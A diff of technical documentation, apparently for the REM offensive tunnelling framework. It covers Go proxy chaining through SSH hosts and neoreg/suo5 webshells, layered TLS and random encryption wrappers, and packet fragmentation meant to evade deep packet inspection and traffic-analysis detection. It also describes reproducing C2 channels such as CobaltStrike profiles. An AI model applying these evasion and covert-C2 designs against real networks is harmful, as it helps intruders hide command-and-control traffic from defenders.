+// WRONG way to use proxy - Applies to HTTP only
 func main() {
     proxyUrl, _ := url.Parse("http://127.0.0.1:8080")
     client := &http.Client{
@@ -660,14 +801,14 @@ func main() {
             Proxy: http.ProxyURL(proxyUrl),
         },
     }
-    // This method only works for HTTP, cannot handle TCP/UDP traffic
+    // This method is only suitable for HTTP and cannot handle TCP/UDP traffic
 }
 ```
 
-**Correct Golang Proxy Usage**
+**Correct Golang Proxy Usage:**
 
 ```go
-// Correct proxy abstraction - protocol-agnostic
+// CORRECT Proxy Abstraction - Protocol Agnostic
 func main() {
     proxyURL, err := url.Parse("socks5://127.0.0.1:1080")
     if err != nil {
@@ -680,7 +821,7 @@ func main() {
     }
 
     transport := &http.Transport{
-        Dial: dialer.Dial, // Directly use Dial interface
+        Dial: dialer.Dial, // Use the Dial interface directly
     }
 
     client := &http.Client{
@@ -690,34 +831,34 @@ func main() {
 }
 ```
 
-The key advantage of this design is that it supports multiple proxy protocols like SOCKS5, HTTP through `proxyclient`'s unified abstraction, directly uses Dial interface avoiding performance loss, while compatible with TCP/UDP traffic, thus applicable to all network application scenarios. By rewriting the dialer interface, we can use any network protocol as proxy. Based on this inspiration, we reimplemented the proxyclient library, greatly expanding Golang's proxy ecosystem.
+The key advantage of this design is that it supports multiple proxy protocols like SOCKS5 and HTTP through the unified abstraction of `proxyclient`. By using the `Dial` interface directly, it avoids performance loss and is compatible with TCP/UDP traffic, thus applying to all network application scenarios. By rewriting the `dialer interface`, we can make any network protocol act as a proxy. Inspired by this, we re-implemented the `proxyclient` library, greatly expanding Golang's native proxy ecosystem.
 
-**Supported Protocols**
+**Supported Protocols:**
 
-- **HTTP/HTTPS**
-- **SOCKS5/4/4a**
-- **ShadowSocks**
-- **SSH proxy**
-- **neoreg (webshell)**
-- **suo5 (webshell)**
+- HTTP/HTTPS
+- SOCKS5/4/4a
+- ShadowSocks
+- SSH Proxy
+- neoreg (WebShell)
+- suo5 (WebShell)
+- ....
 
-**Integration with WebShell Proxies: Bidirectional Interoperability Between neoreg and suo5**
+WebShell Proxy Integration: The Breakthrough of Neoreg and Suo5 Bi-directional Interoperability
 
-Traditional perception holds fundamental differences between WebShell proxies and standard proxy protocols. proxyclient completely breaks this boundary, implementing **bidirectional interoperability architecture** between neoreg and suo5.
+In traditional understanding, there is a fundamental difference between WebShell proxies and standard proxy protocols. proxyclient completely breaks this boundary, implementing a bi-directional interoperability architecture for neoreg and suo5.
 
-In traditional scenarios, tools like pystinger achieve similar effects. They implement bidirectional data interoperability through APIs provided on webshells. But in REM, **we can achieve this using any proxy/webshell**, and we greatly optimize performance through completely in-memory operations.
+In traditional scenarios, tools like `pystinger` achieved similar effects via APIs provided on the WebShell. But in REM, we can use _any_ proxy/WebShell to achieve this, and by operating completely in memory, we vastly optimize performance.
 
 #### 2.4.3 Dynamic Registration Mechanism and Bootstrapping
 
-The dynamic registration mechanism is one of proxyclient's core innovations with REM integration. Its essence is **registering REM itself as proxy protocol in proxyclient, achieving bootstrapping capability**. This allows REM to both use other proxy protocols and be called as proxy protocol by other tools.
+The dynamic registration mechanism is one of the core innovations of `proxyclient` integration with REM. Its essence is registering REM itself as a proxy protocol within `proxyclient`, achieving **bootstrapping** capability. This allows REM to use other proxy protocols and also be called as a proxy protocol by other tools.
 
-**Bidirectional Registration Technical Architecture**
+Technical Architecture of Bi-directional Registration:
 
-[Diagram showing bidirectional registration architecture]
+By registering REM itself as a proxyclient, what was originally an extremely complex integration operation becomes attainable for any Golang tool to use REM's encrypted, stable channel as a transport layer with less than three lines of code.
 
-By registering REM itself as proxyclient, originally extremely complex integration operations **become operations where any Golang tool can use REM-provided encrypted stable channels as transport layer with under three lines of code.**
+Here is a simple example. If there is a C2 tool implemented based on HTTP, we only need `newRemProxyClient` to use it directly as its HTTP transport layer.
 
-This is a simple example. If there's a C2 tool implemented based on HTTP, we only need newRemProxyClient to directly use it as HTTP transport layer.
 
 ```go
 remurl, _ := url.Parse("tcp://nonenonenonenone:@127.0.0.1:1234/?wrapper=raw")
@@ -736,88 +877,100 @@ if err != nil {
 }
 ```
 
-#### 2.4.4 Lossless Proxy Performance Principles
+#### 2.4.4 Principles of Zero-Performance-Loss Proxy
 
-Performance bottlenecks in traditional proxy environments mainly manifest in high-concurrency scenarios, especially port scanning encounters massive packet loss. Main reasons include:
+Performance bottlenecks in traditional proxy environments are mainly reflected in high-concurrency scenarios, especially massive packet loss during port scanning. The main reasons include:
 
-1. **Uneven proxy server implementations**: Many proxy tools (like single-file socks5 tools) lack investment in performance optimization
-2. **Environmental limitation impacts**: WebShell proxies limited by language environment and runtime conditions, poor concurrency performance. Without building duplex channels, can only simulate long connections through polling, with more severe performance bottlenecks
-3. **Client tool limitations**: Tools like proxifier, proxychains, clash mainly optimize for bandwidth, lacking specialized optimization for high-concurrency scenarios
+- **Uneven Proxy Server Implementation:** Many proxy tools (like single-file SOCKS5 tools) lack investment in performance optimization.
+- **Environmental Constraints:** WebShell proxies suffer from poor concurrency due to language environments and runtime conditions. If a duplex channel cannot be built, relying on polling to simulate long connections creates significant bottlenecks.
+- **Client Tool Limitations:** Tools like proxifier, proxychains, and clash are optimized primarily for bandwidth, lacking specific optimization for high-concurrency scenarios.
+    
 
-Based on proxyclient library design, REM achieves performance optimization through in-memory SOCKS5 proxy protocol simulation. The core principle creates memoryPipe in memory, starts memory proxy service through NewConsoleWithCMD, implementing direct data exchange between proxyclient and REM in memory, avoiding real network connection overhead.
+Based on the `proxyclient` library design, REM optimizes performance by simulating the SOCKS5 proxy protocol in memory. The core principle is creating a `memoryPipe` in memory and starting the memory proxy service via `NewConsoleWithCMD`, enabling direct data exchange between `proxyclient` and REM in memory, avoiding the overhead of real network connections.
 
-Another key performance optimization is **timing optimization of SOCKS authentication processing**. REM processes SOCKS authentication when user-server connection establishes, while traditional protocols like frp, nps process authentication at proxy client.
+Another key performance optimization is the timing of SOCKS authentication processing. REM handles SOCKS authentication when the user and server connection is established, whereas traditional protocols like frp and nps handle authentication at the proxy client.
 
-This timing difference brings significant performance impact:
+**Differences in Processing Timing:**
 
-- **REM approach**: One-time authentication completion at connection establishment, subsequent data transmission requires no repeated authentication processing, avoiding authentication overhead accumulation
-- **Traditional approach**: Each connection requires authentication processing at proxy client, increasing computational overhead and latency, serious performance loss in high-concurrency scenarios
+- **REM Method:** Authentication is completed once at connection establishment; subsequent data transmission requires no repetitive authentication processing, avoiding accumulated overhead.
+- **Traditional Method:** Each connection requires authentication processing at the proxy client, increasing computational overhead and latency, causing severe performance loss in high-concurrency scenarios.
+    
 
-By front-loading authentication processing to connection establishment stage, REM avoids repeated authentication overhead in high-concurrency scenarios—an important technical detail achieving zero performance loss.
+By moving authentication processing to the connection establishment phase, REM avoids repetitive authentication overhead in high-concurrency scenarios. This is one of the important technical details for achieving zero performance loss.
 
-#### 2.4.5 Chained Proxy
+#### 2.4.5 Cascading Proxy (Chain Proxy)
 
-Chained proxy is one of proxyclient's core capabilities, supporting chaining multiple proxy servers to form complex proxy chains. This capability has extremely high value in complex network environments.
+Cascading proxying is a core capability of `proxyclient`, supporting the serialization of multiple proxy servers to form complex proxy chains. This capability is of high value in complex network environments.
 
-**Typical Chained Proxy Scenario:**
+**Typical Cascading Proxy Scenario:**
 
-[Mermaid diagram showing attack tool → SSH jumpbox → SOCKS5 proxy → HTTP gateway → neoreg WebShell → target intranet]
+_Network Hierarchy:_
 
-_(In OSI model terms, this is equivalent to network layer routing and protocol conversion, implementing cross-network path selection and protocol adaptation through proxies)_
-
-_We can implement chained proxies through extremely simple configuration._
-
-```go
-proxy1, _ := url.Parse("socks5://localhost:1080")  
-proxy2, _ := url.Parse("http://localhost:8080")  
-dial, err := proxyclient.NewClientChain([]*url.URL{proxy1, proxy2})  
+```
+Local Network -> Boundary Server -> Enterprise Proxy -> Web Server -> Restricted Intranet -> Target Intranet
 ```
 
-### 2.5 Outside Transport Layer: Protocol Stack Orchestrator
+_Attack Tools:_
 
-Sections 2.1-2.4 respectively described Tunnel transport abstraction, Simplex+ARQ reliability transformation, Wrapper encryption/obfuscation, proxyclient proxy integration and other layer capabilities. The Hook mechanism serves as core orchestrator, flexibly combining these scattered capabilities into complete attack channels through priority control and chained execution.
+```
+SSH Jump Host -> SOCKS5 Proxy -> HTTP Gateway -> neoreg WebShell -> REM
+```
+
+_(In the OSI model, this is equivalent to network layer routing and protocol conversion, achieving path selection and protocol adaptation across networks via proxies.)_
+
+We can implement proxy chaining with extremely simple configuration:
+
+```go
+proxy1, _ := url.Parse("socks5://localhost:1080")
+proxy2, _ := url.Parse("http://localhost:8080")
+dial, err := proxyclient.NewClientChain([]*url.URL{proxy1, proxy2})
+```
+
+### 2.5 Above Transport Layers: Protocol Stack Orchestrator
+
+Sections 2.1-2.4 described Tunnel transport abstraction, Simplex+ARQ reliability conversion, Wrapper encryption/obfuscation, and `proxyclient` integration. The **Hook mechanism** acts as the core orchestrator, flexibly combining these scattered capabilities into a complete attack channel through priority control and chained execution.
 
 #### 2.5.1 Hook Mechanism
 
-[https://github.com/chainreactors/rem/blob/master/protocol/tunnel/options.go](https://github.com/chainreactors/rem/blob/master/protocol/tunnel/options.go)
+_Code:_ [`https://github.com/chainreactors/rem/blob/master/protocol/tunnel/options.go`](https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem/blob/master/protocol/tunnel/options.go%5D\(https://github.com/chainreactors/rem/blob/master/protocol/tunnel/options.go\))
 
-In Section 2.1.2, we also used similar mechanisms implementing secondary wrapping operations on Conn like tls, tlsintls, compress, shadowtls.
+We used a similar mechanism in 2.1.2 to implement secondary encapsulations like TLS, TLS-in-TLS, compression, and ShadowTLS on Conn.
 
-Provides BeforeHook and AfterHook two hook types, injecting processing logic before and after connection establishment. The value lies not only in operations on single Conn (like TLS, compression shown in Section 2.1.2), but more in **orchestrating all capabilities from Sections 2.1-2.4 as collaborative whole**.
+It provides two types of hooks: BeforeHook and AfterHook, injecting processing logic before and after connection establishment. This applies not only to operations on a single Conn (as shown in 2.1.2) but also to orchestrating all capabilities from Sections 2.1-2.4 into a coordinated whole.
 
-**Hook's Orchestration Capability**:
+**Hook Orchestration Capabilities:**
 
 ```go
 // Hook orchestration example based on actual code (from console.go)
 tunOpts := []tunnel.TunnelOption{}
 
-// TLS encryption layer (Section 2.1.2)
+// TLS Encryption Layer (Section 2.1.2)
 if console.ConsoleURL.GetQuery("tls") != "" {
     tunOpts = append(tunOpts, tunnel.WithTLS())  // Priority MaxInt-10
 }
 
-// TLS in TLS double encryption (Section 2.1.2)
+// TLS in TLS Double Encryption (Section 2.1.2)
 if console.ConsoleURL.GetQuery("tlsintls") != "" {
     tunOpts = append(tunOpts, tunnel.WithTLSInTLS())  // Priority MaxInt-110
 }
 
-// Network layer: Proxy integration (Section 2.4)
+// Network Layer: Proxy Integration (Section 2.4)
 if len(runner.ForwardAddr) > 0 {
     tunOpts = append(tunOpts, tunnel.WithProxyClient(runner.ForwardAddr))
     // ForwardAddr example: []string{"socks5://proxy:1080", "neoreg://shell/t.php"}
 }
 
-// Data compression (Section 2.1.2)
+// Data Compression (Section 2.1.2)
 if console.ConsoleURL.GetQuery("compress") != "" {
     tunOpts = append(tunOpts, tunnel.WithCompression())  // Priority WrapperPriority±5
 }
 
-// Presentation layer: Encryption/obfuscation chain (Section 2.3.2)
+// Presentation Layer: Encryption Obfuscation Chain (Section 2.3.2)
 var wrapperOpts core.WrapperOptions
 if wrapperStr := console.ConsoleURL.GetQuery("wrapper"); wrapperStr != "" {
     wrapperOpts, _ = core.ParseWrapperOptions(wrapperStr, runner.Key)
 } else {
-    // Auto-generate 2-4 layer random Wrapper
+    // Automatically generate 2-4 layers of random Wrappers
     wrapperOpts = core.GenerateRandomWrapperOptions(2, 4)
 }
 if wrapperOpts != nil {
@@ -825,56 +978,60 @@ if wrapperOpts != nil {
     // Priority WrapperPriority(20)
 }
 
-// Create complete Tunnel, all Hooks auto-orchestrated by priority
+// Create complete Tunnel; all Hooks automatically orchestrated by priority
 tunnel, _ := tunnel.NewTunnel(context.Background(), scheme, isServer, tunOpts...)
 ```
 
-Hook mechanism controls execution order through priority, ensuring each layer processes data in correct order:
+The Hook mechanism executes in order based on priority control, ensuring each layer processes data correctly:
+
+**Data Send Flow (Priority Low to High):**
 
 ```
-Data send flow (priority low to high):
-Raw data
-  ↓ [Priority 20: Wrapper encryption/obfuscation chain] - 2-4 layer random encryption (2.3.2)
-  ↓ [Priority 25: Snappy compression] - Reduce bandwidth (2.1.2)
+Raw Data
+  ↓ [Priority 20: Wrapper Chain] - 2-4 layers random encryption (2.3.2)
+  ↓ [Priority 25: Snappy Compression] - Reduce bandwidth (2.1.2)
   ↓ [Priority MaxInt-110: TLS in TLS] - Inner TLS (2.1.2)
-  ↓ [Priority MaxInt-10: TLS encryption] - Outer TLS (2.1.2)
-  ↓ [Tunnel transmission] - Through Simplex+ARQ (2.2)
-  ↓ [ProxyClient] - Through multi-level proxy (2.4)
-  → Network transmission
-
-Data receive flow (reverse processing):
-Network reception
-  ↓ [ProxyClient] - Reverse proxy chain
-  ↓ [Tunnel reception] - Simplex+ARQ reassembly
-  ↓ [Priority MaxInt-10: TLS decryption] - Strip outer TLS first
-  ↓ [Priority MaxInt-110: TLS in TLS decryption] - Strip inner TLS
-  ↓ [Priority 25: Snappy decompression] - Decompress data
-  ↓ [Priority 20: Wrapper decryption] - Reverse decryption/obfuscation chain
-  → Raw data
+  ↓ [Priority MaxInt-10: TLS Encryption] - Outer TLS (2.1.2)
+  ↓ [Tunnel Transport] - Via Simplex+ARQ (2.2)
+  ↓ [ProxyClient] - Via multi-level proxy (2.4)
+  → Network Transmission
 ```
 
-**Scenario 1: Restricted Enterprise Network Breakthrough**
+**Data Receive Flow (Reverse Processing):**
+
+```
+Network Receive
+  ↓ [ProxyClient] - Reverse proxy chain
+  ↓ [Tunnel Receive] - Simplex+ARQ reassembly
+  ↓ [Priority MaxInt-10: TLS Decryption] - Strip outer TLS
+  ↓ [Priority MaxInt-110: TLS in TLS Decryption] - Strip inner TLS
+  ↓ [Priority 25: Snappy Decompression] - Decompress data
+  ↓ [Priority 20: Wrapper Decryption] - Reverse decryption/obfuscation chain
+  → Raw Data
+```
+
+**Scenario 1: Breaching Restricted Enterprise Networks**
 
 ```go
-// Only HTTPS outbound allowed, need maximum stealth
+// Only HTTPS outbound allowed, maximum covertness required
 tunOpts := []tunnel.TunnelOption{
     tunnel.WithWrappers(false, wrapperOpts),  // Custom encryption (2.3.2)
     tunnel.WithTLS(),                          // Outer TLS camouflage (2.1.2)
 }
-// Effect: Wrapper encryption → TLS wrapping → Looks like normal HTTPS traffic
+// Effect: Wrapper Encryption → TLS Packaging → Looks like normal HTTPS traffic
 ```
 
 **Scenario 2: WebShell Tunnel**
 
 ```go
-// Build high-performance tunnel through WebShell, maximize bandwidth utilization
+// Establish high-performance tunnel via WebShell, maximize bandwidth
 tunOpts := []tunnel.TunnelOption{
-    tunnel.WithProxyClient([]string{"neoreg://webshell/tunnel.php"}), // WebShell proxy (2.4)
+    tunnel.WithProxyClient([]string{"neoreg://webshell/tunnel.php"}), // WebShell Proxy (2.4)
     tunnel.WithCompression(),                                          // Compression (2.1.2)
-    tunnel.WithWrappers(false, lightWeightWrappers),                   // Lightweight encryption (2.3.2)
+    tunnel.WithWrappers(false, lightWeightWrappers),                   // Lightweight Encryption (2.3.2)
 }
-// Effect: Lightweight encryption → Compression → neoreg → WebShell
-//      Single channel multiplexing, bandwidth utilization maximized
+// Effect: Lightweight Encryption → Compression → neoreg → WebShell
+//      Single channel reuse, maximized bandwidth utilization
 ```
 
 **Scenario 3: Multi-layer Encryption Against Deep Inspection**
@@ -883,31 +1040,32 @@ tunOpts := []tunnel.TunnelOption{
 // Counter DPI deep packet inspection, use multi-layer TLS
 tunOpts := []tunnel.TunnelOption{
     tunnel.WithWrappers(false, wrapperOpts),  // Random Wrapper obfuscation (2.3.2)
-    tunnel.WithCompression(),                  // Compression breaks statistical signatures (2.1.2)
+    tunnel.WithCompression(),                  // Compression breaks statistical features (2.1.2)
     tunnel.WithTLSInTLS(),                     // Inner TLS (2.1.2)
     tunnel.WithTLS(),                          // Outer TLS (2.1.2)
 }
 // Effect: Wrapper → Compression → TLS → TLS
-//      Multi-layer nesting, each layer has legitimate certificate, extremely hard to identify
+//      Multi-layer nesting, each layer has valid certs, extremely hard to identify
 ```
 
-1. **Flexible combination of protocol stack capabilities**: Flexibly orchestrate independent capabilities like Tunnel, Simplex, ARQ, Wrapper, proxyclient through priority mechanism
-2. **Rapid recombination for scenario adaptation**: Dynamically control Hook configuration through URL parameters (like `?tls&compress&wrapper=aes-cfb,xor`), no code modification needed
-3. **Fine control of traffic signatures**: Precisely control final traffic signatures through Hook chain order and parameters (encryption layers, compression ratio, TLS nesting depth, etc.)
-4. **Automated adversarial capability**: `GenerateRandomWrapperOptions(2, 4)` auto-generates 2-4 layer random Wrapper, each connection has different encryption chain
+- **Flexible Combination of Protocol Stack Capabilities:** Tunnel, Simplex, ARQ, Wrapper, `proxyclient`, and other independent capabilities are flexibly orchestrated via the priority mechanism.
+- **Rapid Scenario Reconfiguration:** Dynamic control of Hook configuration via URL parameters (e.g., `?tls&compress&wrapper=aes-cfb,xor`) without modifying code.
+- **Fine-grained Control of Traffic Characteristics:** Precise control of final traffic characteristics (encryption levels, compression ratios, TLS nesting depth) via Hook chain order and parameters.
+- **Automated Counter-measures:** `GenerateRandomWrapperOptions(2, 4)` automatically generates 2-4 random Wrapper layers, ensuring the encryption chain is different for every connection.
+    
 
-Through Hook mechanism, REM achieves transformation from "fixed protocol stack" to "orchestratable protocol stack"—one of its core capabilities as attack infrastructure platform.
+Through the Hook mechanism, REM achieves the shift from a "Fixed Protocol Stack" to an "Orchestratable Protocol Stack," which is one of its core capabilities as an offensive infrastructure platform.
 
-#### 2.5.2 Statistical-Level Adversarial Operations
+#### 2.5.2 Statistical Countermeasures
 
-Hook mechanism has another value not introduced in Section 2.1 due to transport layer independence. In Section 2.1, we described this mechanism's essence as secondary operations on Conn. Besides wrapping various techniques from Sections 2.1-2.4 as tunnel hooks, we can add independent hook configurations, such as splitting one packet into multiple packets, adding random time series to each packet, etc.
+The Hook mechanism has another value: because it is transport-agnostic, we didn't introduce it in 2.1. In 2.1, we described the essence of this mechanism as secondary operations on `Conn`. Beyond encapsulating various technologies from 2.1-2.4 as tunnel hooks, we can also add independent hook configurations, such as splitting a packet into multiple packets or adding random time series to each packet.
 
-**Case: Packet Fragmentation**
+Case: Packet Fragmentation
 
-Fragmentation Hook breaks traffic statistical signatures, evading traffic analysis-based detection:
+Fragmentation Hook is used to break statistical characteristics of traffic and evade traffic analysis-based detection:
 
 ```go
-// Statistical adversarial Hook: Packet fragmentation
+// Statistical Countermeasure Hook: Packet Fragmentation
 func WithPacketFragmentation(maxPacketSize int, randomDelay bool) TunnelOption {
     return newFuncTunnelOption(func(do *TunnelService) {
         do.afterHooks = append(do.afterHooks, core.AfterHook{
@@ -925,7 +1083,7 @@ func WithPacketFragmentation(maxPacketSize int, randomDelay bool) TunnelOption {
     })
 }
 
-// Packet fragmentation Conn implementation (conceptual example)
+// Packet Fragmentation Conn Implementation (Conceptual Example)
 type FragmentationConn struct {
     net.Conn
     maxPacketSize int
@@ -933,12 +1091,12 @@ type FragmentationConn struct {
 }
 
 func (f *FragmentationConn) Write(p []byte) (n int, err error) {
-    // Statistical adversarial: Split large packet into multiple small packets
+    // Countermeasure: Split large packets into multiple small packets
     totalLen := len(p)
     offset := 0
 
     for offset < totalLen {
-        // Calculate this send's packet size
+        // Calculate packet size for this send
         chunkSize := f.maxPacketSize
         if offset+chunkSize > totalLen {
             chunkSize = totalLen - offset
@@ -963,34 +1121,33 @@ func (f *FragmentationConn) Write(p []byte) (n int, err error) {
 }
 ```
 
-**Actual Effects of Statistical Adversarial Operations:**
+Actual Effect of Statistical Countermeasures:
 
-Suppose original traffic is one 5KB large packet:
+Assuming original traffic is a 5KB large packet:
 
-```
-Original traffic signature:
-  [=====5000 bytes=====]
-  Signature: Single large packet, obvious burst traffic
+- **Original Traffic Feature:** `[=====5000 bytes=====]` (Single large packet, obvious burst traffic)
 
-After applying fragmentation Hook (maxPacketSize=50):
-  [50] [50] [50] ... [50] [50]  (100 small packets total)
-  Signature: Multiple small packets, similar to normal interactive traffic (like SSH, HTTP requests)
+After applying Fragmentation Hook (`maxPacketSize=50`):
 
-If randomDelay enabled:
-  [50]--5ms--[50]--23ms--[50]--8ms--...
-  Signature: Random packet intervals, closer to human operation time characteristics
-```
+- `[50] [50] [50] ... [50] [50]` (Total 100 small packets)
+- **Feature:** Multiple small packets, similar to normal interactive traffic (like SSH, HTTP requests).
 
-This fragmentation technique effectively breaks traffic statistical signatures:
+If `randomDelay` is enabled:
 
-- **Packet size distribution**: Transforms large packets to small packets, conforming to normal interactive traffic packet size distribution
-- **Burst characteristics**: Eliminates obvious data bursts, traffic becomes smoother
-- **Time characteristics**: Simulates human operation time intervals through random delays
-- **Detection evasion**: Bypasses packet size-based anomaly detection rules (like "single packet exceeds 4KB" alerts)
+- `[50]--5ms--[50]--23ms--[50]--8ms--...`
+- **Feature:** Random packet intervals, closer to the time characteristics of human operation.
 
-**Hook Chain Combined Usage:**
+This fragmentation technique effectively disrupts statistical characteristics:
 
-Multiple Hooks can be combined, executing in priority order:
+- **Packet Size Distribution:** Transforms large packets into small ones, fitting normal interactive traffic distribution.
+- **Burst Characteristics:** Eliminates obvious data bursts, making traffic smoother.
+- **Timing Characteristics:** Simulates human operation intervals via random delays.
+- **Detection Evasion:** Bypasses anomaly detection rules based on packet size (e.g., alerts for "single packet > 4KB").
+    
+
+Hook Chain Combination Usage:
+
+Multiple Hooks can be combined and executed in priority order:
 
 ```go
 tunnel := NewTunnel(
@@ -998,55 +1155,60 @@ tunnel := NewTunnel(
     WithCompression(),                        // Priority 25: Then compress
     WithTLS(),                               // Priority MaxInt-10: Finally TLS encrypt
 )
-
-Data flow processing order:
-Raw data
-  → Fragmentation (100 bytes/packet)
-  → Compression
-  → TLS encryption
-  → Network transmission
 ```
 
-Through Hook mechanism, REM can inject various processing logic at different stages of connection establishment: conventional operations like TLS encryption, data compression, Wrapper obfuscation, as well as statistical adversarial operations like delay injection, traffic shaping, statistical padding. These Hooks execute in priority order, each layer focusing on specific functionality, providing flexible extension capabilities for transport layer.
+**Data Flow Processing Order:**
+
+```
+Raw Data
+  → Fragmentation (100 bytes/packet)
+  → Compression
+  → TLS Encryption
+  → Network Transmission
+```
+
+Through the Hook mechanism, REM can inject various processing logic at different stages of connection establishment: standard operations like TLS encryption, data compression, and Wrapper obfuscation, as well as statistical countermeasures like delay injection, traffic shaping, and padding. These Hooks execute in priority order, with each layer focusing on a specific function, providing flexible extension capabilities for the transport layer.
 
 ---
 
-## 3. Widespread Applications of Offensive Protocol Stack
+## 3. Blossoming Offensive Protocol Stack Application Scenarios
 
-Based on the attack-oriented protocol stack reconstruction architecture built in Chapter 2, REM demonstrates significant improvements in actual network adversarial scenarios. These application scenarios transcend functional enhancements of traditional proxy tools, effectively improving methods and effects of network-side adversarial operations through systematic protocol stack reconstruction.
+Based on the attack-oriented protocol stack reconstruction architecture built in Chapter 2, REM demonstrates significant improvements in actual network confrontation scenarios. These scenarios go beyond the functional enhancements of traditional proxy tools; through systematic protocol stack reconstruction, they effectively improve the methods and outcomes of network-side offensive operations.
 
-Through transport layer's protocol-agnostic transport abstraction, presentation layer's dynamic encryption/obfuscation chain, session layer's lightweight multiplexing, and protocol-boundaryless integration achieved through proxyclient, REM architecture provides effective infrastructure support for various advanced attack applications.
+Through protocol-agnostic transport abstraction at the transport layer, dynamic encryption/obfuscation chains at the presentation layer, lightweight multiplexing at the session layer, and protocol-boundary-free integration via `proxyclient`, the REM architecture provides effective infrastructure support for various advanced attack applications.
 
-Ultimately, we easily replicated capabilities of various tools using REM, and conducted more innovative practices.
+Ultimately, we easily reproduced the capabilities of various tools using REM and conducted more innovative practices.
 
-|**Tool Name**|**Type**|**REM Simulation Capability (Channel/Protocol)**|**Notes**|
+|**Tool Name**|**Type**|**REM Reproduction Capability (Channel/Protocol)**|**Notes**|
 |---|---|---|---|
-|**frp**|**Port forwarding/tunnel**|**Provides TCP/UDP port forwarding, reverse proxy, multi-port listening, etc.**|**Fully implements core functionality**|
-|**gost**|**Tunnel/proxy**|**Simulates multi-protocol tunnels (like TCP, UDP, WebSocket), forwarding and proxy functionality.**|**Fully implements core functionality**|
-|**nps**|**Port forwarding/proxy**|**Provides TCP/UDP port forwarding, reverse proxy, socks5/http proxy, etc.**|**Fully implements core functionality**|
-|**spp**|**Port forwarding**|**Simulates TCP/UDP port forwarding functionality.**|**Fully implements core functionality**|
-|**pingtunnel**|**ICMP tunnel**|**Implements ICMP Echo/Reply-based tunnel communication.**|**Implemented through kcp+icmp**|
-|**iox**|**Port forwarding**|**Provides TCP/UDP-based port forwarding functionality.**|**Implemented port forwarding at application layer**|
-|**GC2-sheet**|**LolC2 (cloud service channel)**|**Simulates C2 channel for data exchange through cloud service APIs like Google Sheets.**|**Implemented through simplex+google/graph api**|
-|**dnstunnel**|**DNS tunnel**|**Simulates DNS query/response mechanism, hiding data in DNS traffic.**|**Implemented through simplex+dns**|
-|**CobaltStrike Profile**|**C2 traffic camouflage**|**Simulates traffic profile signatures of C2 frameworks like CobaltStrike.**|**Can simulate any HTTP protocol through padding wrapper**|
-|**CobaltStrike ExternalC2**|**C2 extension interface**|**Simulates CobaltStrike's ExternalC2 protocol, serving as external communication channel for C2.**|**Implemented externalc2 at application layer**|
-|**suo5**|**WebShell proxy**|**Simulates suo5 webshell proxy protocol, implementing network proxy through webshell.**|**Implemented suo5 client through proxyclient**|
-|**neoreg**|**WebShell proxy**|**Simulates neoreg webshell proxy protocol, implementing network proxy through webshell.**|**Implemented neoreg client through proxyclient**|
-|**Xray**|**Proxy/tunnel platform**|**Simulates its Vless, Trojan protocols and routing, transport layer configuration (like TLS, WebSocket, HTTP/2).**|**Can be integrated into REM. Though REM can implement similar functionality, its capability boundaries are similar to original version, we don't plan to use REM in this aspect**|
-|**Reality**|**TLS camouflage protocol**|**Simulates Reality's traffic camouflage (disguising TLS traffic as normal website traffic) capability.**|**Can be integrated into REM.**|
+|**frp**|Port Forwarding/Tunnel|Provides TCP/UDP port forwarding, reverse proxy, multi-port listening, etc.|Core functions fully implemented|
+|**gost**|Tunnel/Proxy|Simulates multi-protocol tunnels (TCP, UDP, WebSocket), forwarding, and proxy functions.|Core functions fully implemented|
+|**nps**|Port Forwarding/Proxy|Provides TCP/UDP port forwarding, reverse proxy, SOCKS5/HTTP proxy, etc.|Core functions fully implemented|
+|**spp**|Port Forwarding|Simulates TCP/UDP port forwarding functions.|Core functions fully implemented|
+|**pingtunnel**|ICMP Tunnel|Implements tunnel communication based on ICMP Echo/Reply.|Implemented via kcp+icmp|
+|**iox**|Port Forwarding|Provides TCP/UDP-based port forwarding.|Port forwarding implemented in App Layer|
+|**GC2-sheet**|LolC2 (Cloud Service Channel)|Simulates C2 channels exchanging data via Google Sheets and other cloud service APIs.|Implemented via simplex+google/graph api|
+|**dnstunnel**|DNS Tunnel|Simulates DNS query/response mechanism, hiding data in DNS traffic.|Implemented via simplex+dns|
+|**CobaltStrike Profile**|C2 Traffic Masquerade|Simulates CobaltStrike C2 framework traffic profile characteristics.|Can simulate any HTTP protocol via padding wrapper|
+|**CobaltStrike ExternalC2**|C2 Extension Interface|Simulates CobaltStrike ExternalC2 protocol as an external communication channel for C2.|ExternalC2 implemented in App Layer|
+|**suo5**|WebShell Proxy|Simulates suo5 WebShell proxy protocol, proxying via WebShell.|suo5 client implemented via proxyclient|
+|**neoreg**|WebShell Proxy|Simulates neoreg WebShell proxy protocol, proxying via WebShell.|neoreg client implemented via proxyclient|
+|**Xray**|Proxy/Tunnel Platform|Simulates Vless, Trojan protocols and routing/transport config (TLS, WS, HTTP/2).|Can be integrated into REM. Although REM can achieve similar functions, capabilities are similar to original; no plan to use REM here.|
+|**Reality**|TLS Masquerade Protocol|Simulates Reality traffic masquerading (TLS traffic as normal site traffic).|Can be integrated into REM.|
 
-### 3.1 Application Layer Abstraction: Bidirectional Protocol Processing of Outbound and Inbound
+### 3.1 Application Layer Abstraction: Bidirectional Protocol Processing for Outbound & Inbound
 
-**Application Layer Abstraction Requirements**: Chapter 2 built transport, presentation, and session layers providing REM powerful underlying capabilities, but these capabilities ultimately need exposure to users and tools through application layer protocols. REM achieves unified application layer protocol processing framework through two core abstractions: Outbound and Inbound.
+**Application Layer Abstraction Requirements:** The capabilities built in Chapter 2 for Transport, Presentation, and Session layers provide REM with a powerful foundation, but these capabilities ultimately need to be exposed to users and tools via application layer protocols. REM implements a unified processing framework for application layer protocols through two core abstractions: **Outbound** and **Inbound**.
 
-In traditional network tools, each application protocol (SOCKS5, HTTP proxy, Shadowsocks, etc.) requires independent client and server logic implementation, with code duplication and difficult reuse. REM decouples application layer protocol processing into two directional operations through Outbound/Inbound abstraction, combined with dynamic registration mechanism, achieving flexible protocol combination and extension.
+In traditional network tools, each application protocol (SOCKS5, HTTP Proxy, Shadowsocks, etc.) requires independent implementation of client and server logic, leading to code duplication and difficulty in reuse. REM decouples application layer protocol processing into two directional operations via Outbound/Inbound abstraction, combined with a dynamic registration mechanism to achieve flexible combination and extension of protocols.
 
-#### 3.1.1 Outbound: Protocol Server Handling Outbound Connections
+#### 3.1.1 Outbound: Protocol Server Handling Outgoing Connections
 
-**Core Role of Outbound**: Processes protocol connection requests from user tools, parses protocol content, establishes connections to target addresses. Outbound acts as protocol server role, responsible for understanding and responding to protocol requests.
